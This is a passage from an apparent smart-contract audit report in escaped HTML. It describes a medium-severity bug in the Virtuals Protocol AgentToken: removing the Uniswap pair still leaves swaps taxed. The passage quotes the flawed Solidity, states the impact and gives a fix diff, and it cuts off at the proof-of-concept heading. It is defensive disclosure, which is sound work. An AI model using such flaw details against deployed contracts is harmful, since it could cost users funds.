\u003ccode\u003eassetToken\u003c/code\u003e that will be added to the liquidity pool, accounting for slippage.\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-13-removal-of-a-liquidity-pool-on-agenttokenremoveliquiditypool-still-incurs-taxes-on-swaps\" style=\"position:relative;\"\u003e\u003ca href=\"#m-13-removal-of-a-liquidity-pool-on-agenttokenremoveliquiditypool-still-incurs-taxes-on-swaps\" aria-label=\"m 13 removal of a liquidity pool on agenttokenremoveliquiditypool still incurs taxes on swaps permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-51\"\u003e[M-13] Removal of a liquidity pool on \u003ccode\u003eAgentToken::removeLiquidityPool\u003c/code\u003e still incurs taxes on swaps\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-558\"\u003eYouCrossTheLineAlfie\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L279\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L279\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-7\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-7\" aria-label=\"finding description 7 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003eAgentToken.sol\u003c/code\u003e contract uses tax mechanism whenever swaps take place for the added liquidity pools, which can be observed in the transfer functions.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"73\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_msgSender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_transfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisLiquidityPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) || \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisLiquidityPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)));      \u0026lt;\u0026lt; @ - \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// if `isLiquidityPool` returns true, then taxes are levied.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe liquidity pools are added via \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L300\"\u003e\u003ccode\u003eAgentToken::addLiquidityPool\u003c/code\u003e\u003c/a\u003e and during the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L193\"\u003e\u003ccode\u003eAgentToken::_createPair\u003c/code\u003e\u003c/a\u003e call, which takes place during \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L106\"\u003e\u003ccode\u003einitialize\u003c/code\u003e\u003c/a\u003e.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"74\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_createPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euniswapV2Pair_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euniswapV2Pair_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIUniswapV2Factory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_uniswapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euniswapV2Pair_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euniswapV2Pair_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIUniswapV2Factory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_uniswapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreatePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eLiquidityPoolCreated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euniswapV2Pair_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_liquidityPools\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eadd\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euniswapV2Pair_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);        \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Here the `uniswapV2Pair_` gets rightfully added\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euniswapV2Pair_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSimilarly, these liquidity pools are removed via \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L321\"\u003e\u003ccode\u003eAgentToken::removeLiquidityPool\u003c/code\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"75\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eremoveLiquidityPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eremovedLiquidityPool_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwnerOrFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Remove this from the enumerated list:\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_liquidityPools\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eremove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eremovedLiquidityPool_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);           \u0026lt;\u0026lt;@ \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eLiquidityPoolRemoved\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eremovedLiquidityPool_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHowever, the issue lies with the way \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L273\"\u003e\u003ccode\u003eAgentToken::isLiquidityPool\u003c/code\u003e\u003c/a\u003e has been implemented.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"76\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisLiquidityPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003equeryAddress_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/** @dev We check the uniswapV2Pair address first as this is an immutable variable and therefore does not need\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e         * to be fetched from storage, saving gas if this address IS the uniswapV2Pool. We also add this address\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e         * to the enumerated set for ease of reference (for example it is returned in the getter), and it does\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e         * not add gas to any other calls, that still complete in 0(1) time.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e         */\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003equeryAddress_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euniswapV2Pair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_liquidityPools\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econtains\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003equeryAddress_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));   \u0026lt;\u0026lt; @ - \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Returns true even if `uniswapV2Pair` is removed.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAs we can observe, even if the \u003ccode\u003euniswapV2Pair\u003c/code\u003e is removed from the \u003ccode\u003e_liquidityPools\u003c/code\u003e via \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L321\"\u003e\u003ccode\u003eAgentToken::removeLiquidityPool\u003c/code\u003e\u003c/a\u003e call, the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L273\"\u003e\u003ccode\u003eAgentToken::isLiquidityPool\u003c/code\u003e\u003c/a\u003e would still return true, which is incorrect and hence, would cause taxes upon swaps leading to unwanted loss of funds for the users.\u003c/p\u003e\n\u003ch3 id=\"impact-11\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-11\" aria-label=\"impact 11 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eBroken \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L273\"\u003e\u003ccode\u003eAgentToken::isLiquidityPool\u003c/code\u003e\u003c/a\u003e leads to excessive taxes for swaps to users, leading to loss of funds.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-17\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-17\" aria-label=\"recommended mitigation steps 17 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eIt is recommended to set \u003ccode\u003euniswapV2Pair\u003c/code\u003e to a dead/zero address to avoid \u003ccode\u003eisLiquidityPool\u003c/code\u003e returning true.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"77\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    function removeLiquidityPool(address removedLiquidityPool_) external onlyOwnerOrFactory {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // Remove this from the enumerated list:\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        _liquidityPools.remove(removedLiquidityPool_);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+       if(removedLiquidityPool_ == uniswapV2Pair){\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+            uniswapV2Pair = address(0);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        emit LiquidityPoolRemoved(removedLiquidityPool_);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"proof-of-concept-13\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-13\" aria-label=\"proof of concept 13 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 